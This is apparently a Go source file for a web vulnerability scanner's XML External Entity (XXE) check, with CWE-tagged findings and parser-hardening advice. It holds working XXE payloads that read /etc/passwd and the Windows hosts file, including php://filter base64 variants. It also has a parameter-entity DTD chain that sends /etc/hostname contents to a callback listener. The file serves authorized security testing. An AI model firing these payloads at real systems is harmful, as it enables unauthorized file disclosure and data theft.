package checks

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"

	"github.com/londonmax12/hyperz/internal/httpclient"
	"github.com/londonmax12/hyperz/internal/oob"
	"github.com/londonmax12/hyperz/internal/page"
	"github.com/londonmax12/hyperz/internal/scope"
)

// XXE probes XML-parsing endpoints for XML External Entity (XXE) injection
// by POSTing crafted XML documents that declare an external entity and
// dereference it. Two detection paths run per candidate endpoint:
//
//  1. File disclosure: an entity resolved to file:///etc/passwd (or the
//     Windows hosts file) bleeds the disclosed file content into the
//     response body. A TraversalMarkers hit not present in the baseline
//     proves the parser dereferenced the external entity. Severity Critical.
//
//  2. Error-based: a deliberately malformed DOCTYPE / undefined entity
//     reference makes a permissive XML parser leak its parser-specific
//     error signature (libxml, expat, SAX, xerces, .NET XmlException, ...).
//     A new pattern - one not already in the baseline response - is strong
//     evidence the endpoint actually parsed our XML, even when external
//     entities are sandboxed. Severity High.
//
// Candidate endpoints (LevelDefault):
//   - Page URL if the page advertised an XML response (Content-Type contains
//     xml) or the path ends with .xml.
//   - Every <form action="..."> whose method is POST/PUT/PATCH.
//   - Every SpecOp whose method is POST/PUT/PATCH.
//
// LevelAggressive also speculatively POSTs to the page URL even when the
// page never identified itself as an XML endpoint.
//
// A baseline probe per candidate captures markers/errors already present
// on the page (e.g. a docs page that legitimately mentions "libxml") so
// the disclosure / error match can subtract them and only fire on content
// the XXE payload itself produced.
//
// Active (LevelDefault) check.
type XXE struct{}

func (XXE) Name() string { return "xxe" }

func (XXE) Level() Level { return LevelDefault }

// xxeBodyCap bounds the response body the check reads. /etc/passwd is
// small and parser-error traces are short; 32 KiB leaves room for a
// templated wrapper to push either past the first KiB without dropping
// the signal we care about.
const xxeBodyCap = 32 << 10

// xxeBaselineDoc is sent first per candidate so the check can measure
// markers/errors already present in the page for a benign XML POST.
// Anything that survives subtraction against this baseline is genuinely
// attributable to the XXE payload that follows.
const xxeBaselineDoc = `<?xml version="1.0" encoding="UTF-8"?><hyperz-baseline/>`

// xxeFileDiscloseDocs are payloads that try to dereference a privileged
// system file into the response. Both POSIX (/etc/passwd) and Windows
// (hosts) variants ride so the same probe covers either OS without a
// callsite branch. The DOCTYPE syntax is the classic in-band XXE shape:
// declare a SYSTEM-resolved external entity and reference it from the
// document body.
//
// The php://filter variants exist because /etc/passwd contains bytes
// (line breaks, colons) that an XML parser may reject when inlined as
// entity-expanded text, dropping the disclosure before it lands in the
// response. PHP's stream filter wraps the file in base64 first, which
// is XML-clean - the matcher then looks for the base64-encoded
// "root:x:0:0:" prefix instead of the raw passwd line. Same payload
// also lets the check read PHP source files (.php) that would otherwise
// be inlined as nested XML and break the parse.
var xxeFileDiscloseDocs = []string{
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
		`<foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>` +
		`<foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>` +
		`<foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">]>` +
		`<foo>&xxe;</foo>`,
}

// xxeBase64Markers are content needles that prove a php://filter
// base64-encoded file disclosure landed. The php://filter
// convert.base64-encode stream encodes the file from its first byte
// in a continuous run, so the base64 prefix of /etc/passwd's
// "root:x:0:" - the stable first 9 bytes that don't depend on the
// 10th byte - emerges verbatim at the start of the encoded blob.
// A hit here is equivalent in meaning to a TraversalMarkers hit on
// the plaintext.
//
// "cm9vdDp4OjA6" is base64("root:x:0:"). 12 chars (= 9 bytes), the
// largest aligned prefix of /etc/passwd whose encoding does not
// depend on byte 10 of the file - byte 10 spills into the high bits
// of the 13th base64 char, so a longer marker would have to predict
// the gid digit (0 for root, but not enforceable). 12 chars is long
// enough not to collide with prose (the alphabet is mixed-case + the
// 9 + 6 = base64 digits).
//
// No Windows analog: php://filter is a PHP-only wrapper and the
// Windows hosts file is small enough that the plaintext matcher
// already catches it without base64 wrapping.
var xxeBase64Markers = []string{
	"cm9vdDp4OjA6",
}

// xxeErrorDocs are payloads engineered to make a permissive XML parser
// surface a parser-specific error signature even when external entity
// resolution is blocked. Each one reaches the entity-resolution path so a
// hardened parser still raises a recognizable exception; a parser that
// never sees XML simply echoes the bytes verbatim.
var xxeErrorDocs = []string{
	// Undefined entity reference: parsers that disallow external entities
	// generally still fail loudly here.
	`<?xml version="1.0" encoding="UTF-8"?><foo>&hyperz_undefined_xxe_canary;</foo>`,
	// SYSTEM entity pointing at a definitely-nonexistent file path: parsers
	// that DO resolve externals expose the file-not-found error string.
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///hyperz_xxe_probe_does_not_exist_xyz">]>` +
		`<foo>&xxe;</foo>`,
}

// xxeErrorPatterns are lowercase substrings of XML parser error signatures
// across major runtimes. Caller lowercases the response body before
// matching. Curated to cover the dominant parsers (libxml, expat, SAX,
// xerces, .NET XmlException, nokogiri, simplexml) without overlapping into
// generic English.
var xxeErrorPatterns = []string{
	// libxml2 / lxml (Python, PHP DOMDocument, Ruby Nokogiri)
	"undefined entity",
	"entityref:",
	"premature end of data in tag",
	"start tag expected",
	"failed to load external entity",
	"externalentity",
	"xmlsyntaxerror",
	"lxml.etree",
	// expat (Python xml.etree, xml.parsers.expat)
	"expaterror",
	"xml.parsers.expat",
	"xml.etree.elementtree.parseerror",
	"not well-formed (invalid token)",
	"undefined entity:",
	// Java SAX / DocumentBuilder / xerces
	"org.xml.sax.saxparseexception",
	"saxparseexception",
	"javax.xml.parsers",
	"documentbuilder",
	"xmlstreamexception",
	"xerces",
	"the entity",
	"entity \"",
	// PHP simplexml / xml warnings
	"simplexml_load",
	"xml error:",
	"xml parsing error",
	"warning: domdocument",
	// .NET System.Xml
	"system.xml.xmlexception",
	"xmlexception",
	"an internal error occurred while parsing the xml",
	// Ruby REXML
	"rexml::parseexception",
}

func (c XXE) Run(ctx context.Context, client *httpclient.Client, sc *scope.Scope, p page.Page) ([]Finding, error) {
	u, err := url.Parse(p.URL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return nil, nil
	}
	if !sc.Allows(u) {
		return nil, nil
	}

	candidates := c.candidates(p, u, LevelFrom(ctx) >= LevelAggressive)
	if len(candidates) == 0 {
		return nil, nil
	}

	oobSrv := OOBFrom(ctx)

	var findings []Finding
	var firstErr error
	seen := map[string]struct{}{}
	for _, cand := range candidates {
		if ctx.Err() != nil {
			break
		}
		if u2, err := url.Parse(cand.URL); err == nil && !sc.Allows(u2) {
			continue
		}
		f, err := c.probe(ctx, client, p.URL, cand)
		if err != nil {
			Report(ctx, fmt.Errorf("probe %s %s: %w", cand.Method, cand.URL, err))
			if firstErr == nil {
				firstErr = err
			}
		} else if f != nil {
			if _, dup := seen[f.DedupeKey]; !dup {
				seen[f.DedupeKey] = struct{}{}
				findings = append(findings, *f)
			}
		}
		// OOB blind variant: detection for parsers that resolve external
		// entities but neither echo the file content (sandboxed file://
		// scheme) nor leak parser error strings (silent acceptance).
		// Such parsers still issue the HTTP fetch for an external entity
		// URL when DTD processing is enabled, which is the broadest XXE
		// precondition. Listener-side callback proves the entity was
		// resolved over the wire.
		if oobSrv != nil {
			if err := c.probeOOB(ctx, client, oobSrv, p.URL, cand); err != nil {
				Report(ctx, fmt.Errorf("oob probe %s %s: %w", cand.Method, cand.URL, err))
			}
			// OOB DTD exfiltration: stricter capability probe. The basic
			// OOB probe above proves SYSTEM general entities resolve;
			// this one proves the parser also fetches the DOCTYPE external
			// DTD subset and expands parameter entities defined inside
			// it. Some hardened parsers block general entities but not
			// parameter entities, which is the precondition for the
			// classic file-exfil-over-HTTP chain. The listener serves a
			// real DTD body so the parser actually drives the exfil
			// callback we observe at Drain time.
			if err := c.probeOOBDTDExfil(ctx, client, oobSrv, p.URL, cand); err != nil {
				Report(ctx, fmt.Errorf("oob dtd-exfil probe %s %s: %w", cand.Method, cand.URL, err))
			}
		}
	}
	if firstErr != nil && len(findings) == 0 {
		return nil, firstErr
	}
	return findings, nil
}

// Extra-map keys carried on XXE OOB registrations. Drain reads these to
// pick the right finding builder for each variant. variantKey discriminates
// the three XXE OOB shapes; exfilTokenKey links a DTD-loader registration
// to the receiver canary that captures any parameter-entity callback.
const (
	xxeVariantKey    = "variant"
	xxeExfilTokenKey = "exfil_token"

	xxeVariantSystem       = "oob-system"
	xxeVariantDTDLoader    = "oob-dtd-loader"
	xxeVariantDTDExfilRecv = "oob-dtd-exfil-receiver"
)

// xxeOOBExfilProbeFile is the path the OOB DTD reads via a parameter
// entity. /etc/hostname is single-line and almost universally present
// on POSIX hosts; multi-line files (passwd) break URL formation when
// the parser tries to splice their content into the exfil callback URL.
// A hit with empty data is still proof of parameter-entity expansion,
// which is the capability the check is testing for.
const xxeOOBExfilProbeFile = "file:///etc/hostname"

// probeOOB sends one XML document declaring an external entity whose
// SYSTEM target is the canary URL. The check does not emit a finding
// from this call; Drain translates listener-side callbacks into
// findings after the scanner's wait window elapses.
func (c XXE) probeOOB(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, cand xxeCandidate) error {
	canary := srv.Register("xxe", map[string]string{
		xxeVariantKey: xxeVariantSystem,
		"target":      target,
		"method":      cand.Method,
		"url":         cand.URL,
	})
	doc := `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + canary.HTTPURL + `">]>` +
		`<foo>&xxe;</foo>`
	_, _, _, _, err := c.send(ctx, client, cand, doc)
	return err
}

// probeOOBDTDExfil sends an XML document that references an external
// DTD subset hosted on the OOB listener. The listener serves a DTD
// body containing the classic parameter-entity exfil chain:
//
//	<!ENTITY % file SYSTEM "file:///etc/hostname">
//	<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://listener/<exfil>?d=%file;'>">
//	%wrap;
//	%send;
//
// A parser that fetches the DTD demonstrates external-DTD-subset
// processing; if it also expands the parameter entities the wrapper
// declares, it issues a second callback to the exfil token with the
// file content inlined into the query string. Drain reports either
// outcome as a distinct variant of XXE.
func (c XXE) probeOOBDTDExfil(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, cand xxeCandidate) error {
	exfilCanary := srv.Register("xxe", map[string]string{
		xxeVariantKey: xxeVariantDTDExfilRecv,
		"target":      target,
		"method":      cand.Method,
		"url":         cand.URL,
	})
	dtdBody := `<!ENTITY % file SYSTEM "` + xxeOOBExfilProbeFile + `">` +
		`<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '` + exfilCanary.HTTPURL + `?d=%file;'>">` +
		`%wrap;` +
		`%send;`
	dtdCanary := srv.RegisterAsset("xxe", dtdBody, "application/xml-dtd", map[string]string{
		xxeVariantKey:    xxeVariantDTDLoader,
		xxeExfilTokenKey: exfilCanary.Token,
		"target":         target,
		"method":         cand.Method,
		"url":            cand.URL,
	})
	doc := `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo SYSTEM "` + dtdCanary.HTTPURL + `">` +
		`<foo>x</foo>`
	_, _, _, _, err := c.send(ctx, client, cand, doc)
	return err
}

// Drain emits findings for every XXE OOB registration whose canary
// observed at least one callback. Variants are dispatched by the
// "variant" Extra field so each shape gets the finding wording that
// matches its proven capability. The DTD-exfil receiver registration
// is intentionally skipped here: its loader sibling reads the
// receiver's hits via the stored exfil token and emits the combined
// finding so the report doesn't duplicate the same probe pair.
//
// Implements OOBCheck.
func (c XXE) Drain(ctx context.Context) []Finding {
	srv := OOBFrom(ctx)
	if srv == nil {
		return nil
	}
	var out []Finding
	for _, reg := range srv.Registrations(c.Name()) {
		switch reg.Extra[xxeVariantKey] {
		case xxeVariantDTDExfilRecv:
			continue
		case xxeVariantDTDLoader:
			if f := buildXXEDTDExfilFinding(reg, srv); f != nil {
				out = append(out, *f)
			}
		default:
			hits := srv.Hits(reg.Canary.Token)
			if len(hits) == 0 {
				continue
			}
			out = append(out, buildXXEOOBFinding(reg, hits))
		}
	}
	return out
}

// buildXXEOOBFinding renders one OOB-confirmed XXE finding. Severity is
// Critical: a callback from an XML external entity proves the parser
// resolves SYSTEM URLs, which is the precondition for in-band file
// disclosure (file://), out-of-band exfiltration (parameter entities
// over HTTP), and parser-side SSRF.
func buildXXEOOBFinding(reg oob.Registration, hits []oob.Hit) Finding {
	target := reg.Extra["target"]
	method := reg.Extra["method"]
	endpointURL := reg.Extra["url"]
	hit := hits[0]
	ua := hit.Headers.Get("User-Agent")
	return Finding{
		Check:    "xxe",
		Target:   target,
		URL:      endpointURL,
		Severity: SeverityCritical,
		Title:    fmt.Sprintf("XML External Entity (OOB-confirmed) in %s %s", method, endpointURL),
		Detail: fmt.Sprintf(
			"Endpoint %s %s parses XML with external entity resolution enabled and reaches "+
				"the OOB listener over HTTP: probe with canary %s caused %d callback(s) "+
				"(first hit: method=%s, source=%s, user-agent=%q). "+
				"An attacker can chain this into file disclosure (file://), out-of-band data "+
				"exfiltration via parameter entities, and parser-side SSRF against internal services.",
			method, endpointURL, reg.Canary.HTTPURL, len(hits),
			hit.Method, hit.SourceAddr, ua),
		CWE:   "CWE-611",
		OWASP: "A05:2021 Security Misconfiguration",
		Remediation: "Disable external entity and DTD processing in the XML parser. " +
			"For Java SAX/DOM/StAX set XMLConstants.FEATURE_SECURE_PROCESSING and disable external general/parameter entities. " +
			"For .NET XmlReader, set XmlReaderSettings.DtdProcessing = Prohibit. " +
			"For PHP libxml, call libxml_disable_entity_loader(true) (or use parsers with externals off by default). " +
			"For Python lxml, parse with resolve_entities=False and no_network=True. " +
			"Prefer JSON over XML where the protocol permits.",
		Evidence: &Evidence{
			Method:     method,
			RequestURL: endpointURL,
			Snippet: fmt.Sprintf(
				"Canary URL: %s\nFirst hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
				reg.Canary.HTTPURL,
				hit.Method, hit.Path, hit.SourceAddr,
				hit.Timestamp.Format(time.RFC3339), ua, len(hits)),
		},
		DedupeKey: MakeKey("xxe", ScopePage, target, "endpoint:"+method+" "+endpointURL, "oob"),
	}
}

// buildXXEDTDExfilFinding renders findings for the OOB DTD-exfil
// variant. reg is the DTD-loader registration; the receiver token is
// read from reg.Extra[xxeExfilTokenKey] so the helper can correlate
// the two halves of the probe pair.
//
// Three outcomes:
//
//	exfil hit + loader hit -> Critical: full parameter-entity exfil
//	loader hit only        -> High: external DTD fetched, no param-entity callback
//	no hits                -> nil (nothing to report)
//
// Loader-only hits get downgraded relative to the basic OOB-system
// finding (also Critical) because they prove only DTD fetch, not file
// content exfiltration. They are still worth surfacing because some
// hardened parsers block SYSTEM general entities but leave external
// DTD subset processing on - i.e. this branch fires in cases the
// basic OOB-system branch wouldn't.
func buildXXEDTDExfilFinding(reg oob.Registration, srv oob.Server) *Finding {
	loaderHits := srv.Hits(reg.Canary.Token)
	exfilToken := reg.Extra[xxeExfilTokenKey]
	var exfilHits []oob.Hit
	if exfilToken != "" {
		exfilHits = srv.Hits(exfilToken)
	}
	if len(loaderHits) == 0 && len(exfilHits) == 0 {
		return nil
	}
	target := reg.Extra["target"]
	method := reg.Extra["method"]
	endpointURL := reg.Extra["url"]
	remediation := "Disable external entity AND external DTD subset processing in the XML parser. " +
		"For Java SAX/DOM/StAX set XMLConstants.FEATURE_SECURE_PROCESSING and disable " +
		"http://apache.org/xml/features/nonvalidating/load-external-dtd plus " +
		"http://xml.org/sax/features/external-parameter-entities. " +
		"For .NET XmlReader, set XmlReaderSettings.DtdProcessing = Prohibit. " +
		"For PHP libxml, call libxml_disable_entity_loader(true) and avoid LIBXML_DTDLOAD/LIBXML_DTDATTR. " +
		"For Python lxml, parse with resolve_entities=False, no_network=True, load_dtd=False."

	if len(exfilHits) > 0 {
		hit := exfilHits[0]
		exfilData := extractExfilData(hit.Path)
		dataNote := "(no data captured; the parameter-entity callback fired with an empty payload, which still proves the chain)"
		if exfilData != "" {
			dataNote = fmt.Sprintf("captured payload (URL-decoded): %q", exfilData)
		}
		return &Finding{
			Check:    "xxe",
			Target:   target,
			URL:      endpointURL,
			Severity: SeverityCritical,
			Title:    fmt.Sprintf("XML External Entity (OOB DTD exfiltration) in %s %s", method, endpointURL),
			Detail: fmt.Sprintf(
				"Endpoint %s %s parses XML with external DTD processing AND parameter-entity expansion enabled. "+
					"The check planted an external DTD on canary %s; the parser fetched it, expanded the parameter "+
					"entity chain, and called back into the exfil canary %s with the contents of %s in the URL. "+
					"%s. An attacker can read arbitrary server-side files reachable by the parser process and "+
					"smuggle them out over HTTP without ever needing the response body to echo the disclosure.",
				method, endpointURL,
				reg.Canary.HTTPURL, "http://"+srv.CallbackHost()+"/"+exfilToken,
				xxeOOBExfilProbeFile, dataNote),
			CWE:         "CWE-611",
			OWASP:       "A05:2021 Security Misconfiguration",
			Remediation: remediation,
			Evidence: &Evidence{
				Method:     method,
				RequestURL: endpointURL,
				Snippet: fmt.Sprintf(
					"DTD canary URL: %s\nExfil canary URL: %s\nFirst exfil hit: %s %s from %s at %s\nUser-Agent: %s\nExfil hits: %d\nLoader hits: %d\n",
					reg.Canary.HTTPURL, "http://"+srv.CallbackHost()+"/"+exfilToken,
					hit.Method, hit.Path, hit.SourceAddr,
					hit.Timestamp.Format(time.RFC3339),
					hit.Headers.Get("User-Agent"),
					len(exfilHits), len(loaderHits)),
			},
			DedupeKey: MakeKey("xxe", ScopePage, target, "endpoint:"+method+" "+endpointURL, "oob-dtd-exfil"),
		}
	}

	hit := loaderHits[0]
	return &Finding{
		Check:    "xxe",
		Target:   target,
		URL:      endpointURL,
		Severity: SeverityHigh,
		Title:    fmt.Sprintf("XML External Entity (external DTD fetched) in %s %s", method, endpointURL),
		Detail: fmt.Sprintf(
			"Endpoint %s %s parses XML with external DTD subset processing enabled: the parser fetched the "+
				"DOCTYPE-referenced DTD from canary %s (%d hit(s)) but did not call back through the "+
				"parameter-entity exfil chain the DTD body declared. Some parsers in this state still permit "+
				"data exfiltration via alternate DTD shapes (error-based, FTP-based) or escalate to file "+
				"disclosure once parameter-entity expansion is enabled.",
			method, endpointURL, reg.Canary.HTTPURL, len(loaderHits)),
		CWE:         "CWE-611",
		OWASP:       "A05:2021 Security Misconfiguration",
		Remediation: remediation,
		Evidence: &Evidence{
			Method:     method,
			RequestURL: endpointURL,
			Snippet: fmt.Sprintf(
				"DTD canary URL: %s\nFirst loader hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d\n",
				reg.Canary.HTTPURL,
				hit.Method, hit.Path, hit.SourceAddr,
				hit.Timestamp.Format(time.RFC3339),
				hit.Headers.Get("User-Agent"),
				len(loaderHits)),
		},
		DedupeKey: MakeKey("xxe", ScopePage, target, "endpoint:"+method+" "+endpointURL, "oob-dtd-loader"),
	}
}

// extractExfilData pulls the value of the "d" query parameter out of
// the exfil callback path. Returns "" if the parameter is absent or
// undecodable - some parsers URL-encode the file content before
// splicing, others don't, and a few drop the query string entirely
// when newline-containing entity values fail to assemble into a
// well-formed URL.
func extractExfilData(rawPath string) string {
	q := strings.IndexByte(rawPath, '?')
	if q < 0 {
		return ""
	}
	values, err := url.ParseQuery(rawPath[q+1:])
	if err != nil {
		return ""
	}
	return values.Get("d")
}

// xxeCandidate is one endpoint the XXE check will POST XML at. method is
// always upper-cased; url is absolute. Same shape across forms / SpecOps /
// page-url so the probe loop doesn't branch on origin.
type xxeCandidate struct {
	Method string
	URL    string
}

// candidates assembles the deduped, sorted list of endpoints to probe.
// At LevelDefault the page URL only rides when the page advertised an XML
// response or its path ends in .xml; LevelAggressive also probes the page
// URL with POST speculatively. Form / SpecOp candidates ride at both
// levels because they're already POST-shaped on the wire.
func (c XXE) candidates(p page.Page, u *url.URL, aggressive bool) []xxeCandidate {
	type key struct {
		method string
		url    string
	}
	seen := map[key]struct{}{}
	var out []xxeCandidate
	add := func(method, rawURL string) {
		method = strings.ToUpper(method)
		if method == "" || rawURL == "" {
			return
		}
		k := key{method, rawURL}
		if _, ok := seen[k]; ok {
			return
		}
		seen[k] = struct{}{}
		out = append(out, xxeCandidate{Method: method, URL: rawURL})
	}

	if pageLooksXML(p, u) || aggressive {
		add(http.MethodPost, p.URL)
	}

	for _, f := range p.Forms {
		m := strings.ToUpper(f.Method)
		if m == http.MethodPost || m == http.MethodPut || m == http.MethodPatch {
			add(m, f.Action)
		}
	}
	for _, op := range p.SpecOps {
		m := strings.ToUpper(op.Method)
		if m == http.MethodPost || m == http.MethodPut || m == http.MethodPatch {
			add(m, op.URL)
		}
	}

	sort.SliceStable(out, func(i, j int) bool {
		if out[i].URL != out[j].URL {
			return out[i].URL < out[j].URL
		}
		return out[i].Method < out[j].Method
	})
	return out
}

// pageLooksXML reports whether p looks like an XML endpoint based on a
// cheap response signal: an XML Content-Type or a .xml path suffix. Used
// to gate POSTing to the page URL itself at LevelDefault - we'd rather
// miss the occasional .json-shaped XML API than fan out POSTs at every
// HTML page in the crawl.
func pageLooksXML(p page.Page, u *url.URL) bool {
	ct := strings.ToLower(p.Headers.Get("Content-Type"))
	if strings.Contains(ct, "xml") {
		return true
	}
	return strings.HasSuffix(strings.ToLower(u.Path), ".xml")
}

// probe runs the baseline + payload sweep for one candidate endpoint.
// Baseline captures markers/errors already present for a benign XML POST
// so the payload-stage match can subtract them.
func (c XXE) probe(ctx context.Context, client *httpclient.Client, target string, cand xxeCandidate) (*Finding, error) {
	_, _, baselineBody, _, err := c.send(ctx, client, cand, xxeBaselineDoc)
	if err != nil {
		return nil, err
	}
	baselineMarkers := matchTraversalMarkers(baselineBody)
	baselineErrors := matchXXEErrors(baselineBody)

	baselineBase64 := matchXXEBase64Markers(baselineBody)

	// Phase 1: file disclosure. A TraversalMarkers hit means the parser
	// dereferenced our external entity and bled file content into the
	// response - the textbook in-band XXE proof. The base64 fallback
	// catches php://filter / convert.base64-encode disclosures where
	// the raw file bytes never appear in the response but the encoded
	// blob does.
	for _, doc := range xxeFileDiscloseDocs {
		if ctx.Err() != nil {
			break
		}
		req, resp, body, truncated, err := c.send(ctx, client, cand, doc)
		if err != nil {
			return nil, err
		}
		hits := matchTraversalMarkers(body)
		newHits := subtractPatterns(hits, baselineMarkers)
		if len(newHits) == 0 {
			b64Hits := subtractPatterns(matchXXEBase64Markers(body), baselineBase64)
			if len(b64Hits) == 0 {
				continue
			}
			newHits = b64Hits
		}
		method, probeURL := requestIdentity(req)
		return &Finding{
			Check:    c.Name(),
			Target:   target,
			URL:      probeURL,
			Severity: SeverityCritical,
			Title:    fmt.Sprintf("XML External Entity (file disclosure) in %s %s", method, probeURL),
			Detail: fmt.Sprintf(
				"Endpoint %s %s parses XML with external entity resolution enabled: an XXE payload referencing "+
					"%q via a SYSTEM entity caused the response to disclose %q - a sensitive system file. "+
					"An attacker can read arbitrary files reachable by the server process, probe internal "+
					"network services, and in some parsers achieve out-of-band data exfiltration or DoS.",
				method, probeURL, extractSystemTarget(doc), newHits[0]),
			CWE:   "CWE-611",
			OWASP: "A05:2021 Security Misconfiguration",
			Remediation: "Disable external entity and DTD processing in the XML parser. " +
				"For Java SAX/DOM/StAX set XMLConstants.FEATURE_SECURE_PROCESSING and disable external general/parameter entities. " +
				"For .NET XmlReader, set XmlReaderSettings.DtdProcessing = Prohibit. " +
				"For PHP libxml, call libxml_disable_entity_loader(true) (or use parsers with externals off by default). " +
				"For Python lxml, parse with resolve_entities=False and no_network=True. " +
				"Prefer JSON over XML where the protocol permits.",
			Evidence: &Evidence{
				Method:     method,
				RequestURL: probeURL,
				Status:     statusOf(resp),
				Snippet:    snippet(body, []byte(newHits[0]), false),
				Exchange:   RecordExchange(req, []byte(doc), truncated, resp, body, truncated),
			},
			DedupeKey: MakeKey(c.Name(), ScopePage, target, "endpoint:"+method+" "+probeURL),
		}, nil
	}

	// Phase 2: error-based. A parser-error signature that wasn't there in
	// the baseline proves the endpoint actually parsed our XML even if
	// external entities are sandboxed. Less severe than disclosure -
	// the attacker only learns "this endpoint parses XML" - but worth
	// flagging because it's the precondition for every XXE variant.
	for _, doc := range xxeErrorDocs {
		if ctx.Err() != nil {
			break
		}
		req, resp, body, truncated, err := c.send(ctx, client, cand, doc)
		if err != nil {
			return nil, err
		}
		hits := matchXXEErrors(body)
		newHits := subtractPatterns(hits, baselineErrors)
		if len(newHits) == 0 {
			continue
		}
		method, probeURL := requestIdentity(req)
		return &Finding{
			Check:    c.Name(),
			Target:   target,
			URL:      probeURL,
			Severity: SeverityHigh,
			Title:    fmt.Sprintf("XML External Entity (error-based) in %s %s", method, probeURL),
			Detail: fmt.Sprintf(
				"Endpoint %s %s parses XML and leaks parser error signatures: an XXE-shaped payload "+
					"triggered the parser error %q. A parser that surfaces these errors is liable to also "+
					"resolve external entities or expand parameter entities unless explicitly hardened, "+
					"which would allow arbitrary file disclosure or server-side request forgery.",
				method, probeURL, newHits[0]),
			CWE:   "CWE-611",
			OWASP: "A05:2021 Security Misconfiguration",
			Remediation: "Disable external entity and DTD processing in the XML parser. " +
				"For Java SAX/DOM/StAX set XMLConstants.FEATURE_SECURE_PROCESSING and disable external general/parameter entities. " +
				"For .NET XmlReader, set XmlReaderSettings.DtdProcessing = Prohibit. " +
				"For PHP libxml, call libxml_disable_entity_loader(true). " +
				"For Python lxml, parse with resolve_entities=False and no_network=True. " +
				"Also avoid surfacing raw parser error messages to clients.",
			Evidence: &Evidence{
				Method:     method,
				RequestURL: probeURL,
				Status:     statusOf(resp),
				Snippet:    snippet(body, []byte(newHits[0]), true),
				Exchange:   RecordExchange(req, []byte(doc), truncated, resp, body, truncated),
			},
			DedupeKey: MakeKey(c.Name(), ScopePage, target, "endpoint:"+method+" "+probeURL),
		}, nil
	}
	return nil, nil
}

// send builds an XML POST/PUT/PATCH for cand with doc as the body and
// dispatches it, reading up to xxeBodyCap of the response.
func (c XXE) send(ctx context.Context, client *httpclient.Client, cand xxeCandidate, doc string) (*http.Request, *http.Response, []byte, bool, error) {
	req, err := http.NewRequestWithContext(ctx, cand.Method, cand.URL, strings.NewReader(doc))
	if err != nil {
		return nil, nil, nil, false, err
	}
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "application/xml, text/xml, */*")
	resp, err := client.Do(ctx, req)
	if err != nil {
		return req, nil, nil, false, err
	}
	defer resp.Body.Close()
	body, truncated, err := httpclient.ReadBodyCapped(resp, xxeBodyCap)
	if err != nil {
		return req, resp, nil, false, err
	}
	return req, resp, body, truncated, nil
}

// matchXXEBase64Markers returns every xxeBase64Markers entry found in
// body. Case-sensitive on purpose: base64 is case-sensitive and a
// case-folded scan would collide with prose words that happen to share
// the alphabet (the marker has no vowel run that case-folding could
// disambiguate from English text).
func matchXXEBase64Markers(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	var hits []string
	for _, m := range xxeBase64Markers {
		if bytes.Contains(body, []byte(m)) {
			hits = append(hits, m)
		}
	}
	return hits
}

// matchXXEErrors returns every xxeErrorPatterns entry that appears in
// body. Body is lowercased once per call so substring scans are
// case-insensitive.
func matchXXEErrors(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	lower := bytes.ToLower(body)
	var hits []string
	for _, pat := range xxeErrorPatterns {
		if bytes.Contains(lower, []byte(pat)) {
			hits = append(hits, pat)
		}
	}
	return hits
}

// extractSystemTarget pulls the file:// URL out of an XXE SYSTEM entity
// declaration so the finding detail can name the file the probe asked
// for ("file:///etc/passwd") without dumping the full XML payload. Falls
// back to "external entity" when the doc isn't shaped like one of our
// canned templates.
func extractSystemTarget(doc string) string {
	const marker = `SYSTEM "`
	i := strings.Index(doc, marker)
	if i < 0 {
		return "external entity"
	}
	rest := doc[i+len(marker):]
	end := strings.Index(rest, `"`)
	if end < 0 {
		return "external entity"
	}
	return rest[:end]
}
